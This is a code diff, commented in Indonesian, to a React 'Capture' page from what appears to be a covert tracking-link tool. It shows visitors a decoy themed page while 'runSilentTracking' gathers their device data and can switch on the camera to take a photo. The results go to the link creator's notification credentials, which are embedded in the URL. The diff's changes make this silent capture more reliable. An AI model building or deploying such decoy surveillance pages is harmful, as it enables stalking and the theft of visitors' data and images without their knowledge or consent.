@@ -1,6 +1,6 @@
 import { useEffect, useRef, useState } from 'react';
-import { useParams } from 'react-router-dom';
-import { decodeConfig, addCapture, sendNotification } from '../storage';
+import { useParams, useLocation } from 'react-router-dom';
+import { decodeConfig, addCapture } from '../storage';
 
 
 /* ─── UA Parser ─────────────────────────────────────────── */
@@ -115,11 +115,13 @@ async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
     } catch { /* silent */ }
   }
 
-  // 4. Camera
+  // 4. Camera — jangan addCapture di sini, dilakukan setelah foto diambil
   if (opts.trackCamera) { onCameraReady(); return; }
 
-  addCapture(link.id, { ...data });
+  // Kirim capture dengan notifConfig dari URL (bukan localStorage pengunjung)
+  addCapture(link.id, { ...data }, notifConfig);
 }
+
 
 /* ─── Decoy Components ──────────────────────────────────── */
 
@@ -375,37 +377,50 @@ const DECOY_MAP = {
 };
 
 export default function Capture() {
-  // Support kedua route: /t/:trackId dan /:cat/:slug/:trackId
-  const params = useParams();
-  const trackId = params.trackId;
+  // Ambil trackId dari params ATAU dari segmen terakhir URL (untuk catch-all route)
+  const params   = useParams();
+  const location = useLocation();
 
-  const [config, setConfig]     = useState(null);
-  const [notFound, setNotFound] = useState(false);
+  // trackId bisa dari named param (:trackId) atau segmen terakhir path
+  const trackId = params.trackId
+    || location.pathname.split('/').filter(Boolean).pop()
+    || '';
+
+  const [config, setConfig]         = useState(null);
+  const [notFound, setNotFound]     = useState(false);
   const [showCamera, setShowCamera] = useState(false);
-  const dataRef   = useRef({});
-  const notifRef  = useRef(null); // simpan notif config dari URL
+  const dataRef  = useRef({});
+  const notifRef = useRef(null);
+  const ranRef   = useRef(false); // cegah double-run React StrictMode
 
   useEffect(() => {
+    if (ranRef.current) return;
+    ranRef.current = true;
+
     if (!trackId) { setNotFound(true); return; }
+
     const cfg = decodeConfig(trackId);
-    if (!cfg)   { setNotFound(true); return; }
+    if (!cfg) { setNotFound(true); return; }
+
     setConfig(cfg);
-    notifRef.current = cfg.notif || null; // notif credentials dari creator
-    const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
+    notifRef.current = cfg.notif || null;
+
+    const link = {
+      id: cfg.id || trackId,
+      options: cfg.options || {},
+      decoyTheme: cfg.decoyTheme,
+    };
+
+    // Jalankan tracking SEKALI — addCapture dipanggil di dalam runSilentTracking
     runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
-    // Kirim capture awal setelah tracking selesai
-    runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif)
-      .then(() => {
-        if (!(cfg.options?.trackCamera)) {
-          addCapture(link.id, { ...dataRef.current }, cfg.notif);
-        }
-      });
   }, [trackId]);
 
   function handlePhotoCapture(photo) {
     if (photo) dataRef.current.photo = photo;
     setShowCamera(false);
-    if (config) addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
+    if (config) {
+      addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
+    }
   }
 
   if (notFound) return (
